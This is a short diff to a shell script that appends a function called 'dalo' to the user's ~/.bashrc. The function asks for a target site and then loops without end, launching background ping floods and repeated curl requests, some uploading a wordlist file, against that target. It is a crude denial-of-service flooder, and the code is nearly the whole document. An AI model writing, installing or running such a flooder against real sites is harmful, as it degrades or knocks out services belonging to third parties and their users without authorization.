@@ -118,3 +118,14 @@ else
 fi
 }
 ' >> ~/.bashrc
+echo '
+dalo(){
+echo "Insert your target. (DONT USE IN A DEVICE WITH LESS THAN 4GB RAM OR FOR CRIMES!)"
+read site
+while true; do
+ping -c 1000000 $site &
+curl -k -L -T wordlist.txt $site &
+curl -k -L $site &
+done
+}
+'
